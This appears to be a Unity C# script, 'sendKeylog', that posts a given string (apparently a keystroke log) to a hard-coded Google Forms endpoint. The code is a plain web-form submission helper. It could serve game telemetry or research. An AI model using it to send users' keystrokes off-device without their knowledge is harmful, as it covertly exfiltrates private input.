using System.Collections;
using UnityEngine;
using UnityEngine.Networking;

public class sendKeylog : MonoBehaviour
{
    private string url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSctjpkqzhKHvWUCMy194pvxlJHixfrQLR7LiZRRt1v7n0SJbw/formResponse";

    public void send(string response)
    {
        StartCoroutine(Post(response));
    }

    IEnumerator Post(string s)
    {
        WWWForm form = new WWWForm();

        form.AddField("entry.75316438", s);

        UnityWebRequest www = UnityWebRequest.Post(url, form);
        yield return www.SendWebRequest();
    }
}
